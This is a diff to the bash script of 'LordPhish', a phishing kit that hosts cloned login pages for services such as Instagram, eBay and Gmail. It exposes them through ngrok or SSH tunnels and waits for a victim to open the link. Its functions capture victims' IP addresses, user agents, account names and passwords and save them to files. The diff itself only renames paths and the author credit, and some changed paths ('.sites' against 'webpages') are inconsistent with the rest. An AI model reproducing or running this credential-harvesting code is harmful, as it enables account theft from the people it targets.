@@ -111,7 +111,7 @@ echo
 echo
 printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.  \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX/Ch4r0nN \e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
 printf "\n"
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
@@ -147,7 +147,7 @@ echo -e "$R║$W██████$R║$W█████████$R║\033[00
 echo
 printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.   \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX/Ch4r0nN \e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m          \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;96m Gmail   \e[0m   \n"  
 
@@ -777,12 +777,12 @@ createpage() {
 }
 
 catch_cred() {
-    account=$(grep -o 'Account:.*' .webpages/$server/usernames.txt | cut -d " " -f2)
+    account=$(grep -o 'Account:.*' webpages/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
-    password=$(grep -o 'Pass:.*' .webpages/$server/usernames.txt | cut -d ":" -f2)
+    password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-    cat .webpages/$server/usernames.txt >> .webpages/$server/saved.usernames.txt
+    cat webpages/$server/usernames.txt >> webpages/$server/saved.usernames.txt
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m webpages/%s/saved.usernames.txt\e[0m\n" $server
     killall -2 php > /dev/null 2>&1
     killall -2 ngrok > /dev/null 2>&1
@@ -796,7 +796,7 @@ catch_cred() {
 getcredentials() {
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
     while [ true ]; do
-    if [[ -e ".webpages/$server/usernames.txt" ]]; then
+    if [[ -e ".sites/$server/usernames.txt" ]]; then
         printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
         catch_cred
     fi
@@ -806,13 +806,13 @@ getcredentials() {
 
 catch_ip() {
     touch webpages/$server/saved.usernames.txt
-    ip=$(grep -a 'IP:' .webpages/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+    ip=$(grep -a 'IP:' webpages/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
     IFS=$'\n'
-    ua=$(grep 'User-Agent:' .webpages/$server/ip.txt | cut -d '"' -f2)
+    ua=$(grep 'User-Agent:' webpages/$server/ip.txt | cut -d '"' -f2)
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-    cat .webpages/$server/ip.txt >> .webpages/$server/saved.ip.txt
+    cat webpages/$server/ip.txt >> webpages/$server/saved.ip.txt
     if [[ -e iptracker.log ]]; then
         rm -rf iptracker.log
     fi
@@ -900,14 +900,13 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd .webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
 printf "\n"
 checkfound
 }
-
 start_local(){
 def_port="5555"
 printf "\e[0m\n"
@@ -916,7 +915,7 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd .webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
@@ -931,23 +930,23 @@ printf "\e[0m\n"
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
 while [ true ]; do
-if [[ -e ".webpages/$server/ip.txt" ]]; then
+if [[ -e "webpages/$server/ip.txt" ]]; then
 c_ip
-rm -rf .webpages/$server/ip.txt
+rm -rf webpages/$server/ip.txt
 fi
 sleep 0.75
-if [[ -e ".webpages/$server/usernames.txt" ]]; then
-account=$(grep -o 'Username:.*' .webpages/$server/usernames.txt | cut -d " " -f2)
+if [[ -e ".sites/$server/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' webpages/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' .webpages/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .webpages/$server/usernames.txt >> .webpages/$server/login_info.txt
+cat webpages/$server/usernames.txt >> webpages/$server/login_info.txt
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
-rm -rf .webpages/$server/usernames.txt
+rm -rf webpages/$server/usernames.txt
 fi
 sleep 0.75
 done
@@ -956,7 +955,7 @@ done
 
 serverx() {
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-    cd .webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
     sleep 2
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
     command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
@@ -976,11 +975,11 @@ serverx() {
 }
 
 startx() {
-    if [[ -e .webpages/$server/ip.txt ]]; then
-        rm -rf .webpages/$server/ip.txt
+    if [[ -e webpages/$server/ip.txt ]]; then
+        rm -rf webpages/$server/ip.txt
     fi
-        if [[ -e .webpages/$server/usernames.txt ]]; then
-            rm -rf .webpages/$server/usernames.txt
+        if [[ -e webpages/$server/usernames.txt ]]; then
+            rm -rf webpages/$server/usernames.txt
         fi
             default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
             printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
@@ -993,14 +992,14 @@ startx() {
 ##
 
 start() {
-    if [[ -e .webpages/$server/ip.txt ]]; then
-        rm -rf .webpages/$server/ip.txt
+    if [[ -e webpages/$server/ip.txt ]]; then
+        rm -rf webpages/$server/ip.txt
     fi
-        if [[ -e .webpages/$server/usernames.txt ]]; then
-            rm -rf .webpages/$server/usernames.txt
+        if [[ -e webpages/$server/usernames.txt ]]; then
+            rm -rf webpages/$server/usernames.txt
         fi
             printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-            cd .webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+            cd webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
             sleep 2
             printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
             ./ngrok http 3333 > /dev/null 2>&1 &
@@ -1022,27 +1021,27 @@ checkfound() {
     printf "\n"
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
     while [ true ]; do
-        if [[ -e ".webpages/$server/ip.txt" ]]; then
+        if [[ -e "webpages/$server/ip.txt" ]]; then
             printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
             catch_ip
-            rm -rf .webpages/$server/ip.txt
+            rm -rf webpages/$server/ip.txt
         fi
             sleep 0.5
-            if [[ -e ".webpages/$server/usernames.txt" ]]; then
+            if [[ -e "webpages/$server/usernames.txt" ]]; then
                 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                 catch_cred
-                rm -rf .webpages/$server/usernames.txt
+                rm -rf webpages/$server/usernames.txt
                 fi
-                if [[ -e ".webpages/$server/saved.ip.txt" ]]; then
+                if [[ -e "webpages/$server/saved.ip.txt" ]]; then
                     printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
                     catch_ip
-                    rm -rf .webpages/$server/saved.ip.txt
+                    rm -rf webpages/$server/saved.ip.txt
                 fi
                     sleep 0.5
-                    if [[ -e ".webpages/$server/saved.usernames.txt" ]]; then
+                    if [[ -e "webpages/$server/saved.usernames.txt" ]]; then
                         printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                         catch_cred
-                        rm -rf .webpages/$server/saved.usernames.txt
+                        rm -rf webpages/$server/saved.usernames.txt
                     fi
                         sleep 0.5
                         done
